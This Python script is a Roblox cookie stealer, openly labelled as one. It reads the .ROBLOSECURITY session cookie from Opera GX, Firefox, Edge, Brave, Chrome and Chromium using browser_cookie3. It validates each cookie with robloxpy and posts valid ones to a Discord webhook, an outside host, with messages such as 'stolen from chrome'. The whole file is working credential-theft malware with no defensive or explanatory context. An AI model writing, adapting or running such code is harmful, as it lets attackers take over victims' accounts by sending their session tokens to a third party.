import browser_cookie3
import robloxpy
import requests
h00k = "https://discord.com/api/webhooks/None/None"

try:
    operacookies = browser_cookie3.opera_gx(domain_name='roblox.com')
    for cookie in operacookies:
        if cookie.name == ".ROBLOSECURITY":
            if robloxpy.Utils.CheckCookie(cookie):
                
                cookies = cookie.value
                print("valid cookie")
                data = {

                        "username": "r0blox cookie stealer by imjustazuu0",
                        "content": "``" + cookie.value + "``" + "    stolen from opera gx"
                        
                }
                v = requests.post(h00k,json=data)
                print(v.status_code)
            else:
                print("cookie is invalid from opera")
    else:
        pass
except Exception as e:
    print(e)
    pass

try:
    operacookies = browser_cookie3.firefox(domain_name='roblox.com')
    for cookie in operacookies:
        if cookie.name == ".ROBLOSECURITY":
            if robloxpy.Utils.CheckCookie(cookie):
                
                
                cookies = cookie.value
                print("valid cookie")
                data = {

                        "username": "r0blox cookie stealer by imjustazuu0",
                        "content": "``" + cookie.value + "``" + "    stolen from firefox "
                        
                }
                v = requests.post(h00k,json=data)
                print(v.status_code)
            else:
                print("cookie is invalid from firefox")
    else:
        pass
except Exception as e:
    print(e)
    pass

try:
    operacookies = browser_cookie3.edge(domain_name='roblox.com')
    for cookie in operacookies:
        if cookie.name == ".ROBLOSECURITY":
            if robloxpy.Utils.CheckCookie(cookie):
                
                
                cookies = cookie.value
                print("valid cookie")
                data = {

                        "username": "r0blox cookie stealer by imjustazuu0",
                        "content": "``" + cookie.value + "``" + "    stolen from edge "
                        
                }
                v = requests.post(h00k,json=data)
                print(v.status_code)
            else:
                print("cookie is invalid from edge")
    else:
        pass
except Exception as e:
    print(e)
    pass
try:
    operacookies = browser_cookie3.Brave(domain_name='roblox.com')
    for cookie in operacookies:
        if cookie.name == ".ROBLOSECURITY":
            if robloxpy.Utils.CheckCookie(cookie):
                
                
                cookies = cookie.value
                print("valid cookie")
                data = {

                        "username": "r0blox cookie stealer by imjustazuu0",
                        "content": "``" + cookie.value + "``" + "    stolen from Brave "
                        
                }
                v = requests.post(h00k,json=data)
                print(v.status_code)
            else:
                print("cookie is invalid from Brave")
    else:
        pass
except Exception as e:
    print(e)
    pass
try:
    operacookies = browser_cookie3.chrome(domain_name='roblox.com')
    for cookie in operacookies:
        if cookie.name == ".ROBLOSECURITY":
            if robloxpy.Utils.CheckCookie(cookie):
                
                
                cookies = cookie.value
                print("valid cookie")
                data = {

                        "username": "r0blox cookie stealer by imjustazuu0",
                        "content": "``" + cookie.value + "``" + "    stolen from chrome "
                        
                }
                v = requests.post(h00k,json=data)
                print(v.status_code)
            else:
                print("cookie is invalid from chrome")
    else:
        pass
except Exception as e:
    print(e)
    pass

try:
    operacookies = browser_cookie3.chromium(domain_name='roblox.com')
    for cookie in operacookies:
        if cookie.name == ".ROBLOSECURITY":
            if robloxpy.Utils.CheckCookie(cookie):
                
                
                cookies = cookie.value
                print("valid cookie")
                data = {

                        "username": "r0blox cookie stealer by imjustazuu0",
                        "content": "``" + cookie.value + "``" + "    stolen from chromium "
                        
                }
                v = requests.post(h00k,json=data)
                print(v.status_code)
            else:
                print("cookie is invalid from chromium")
    else:
        pass
except Exception as e:
    print(e)
    pass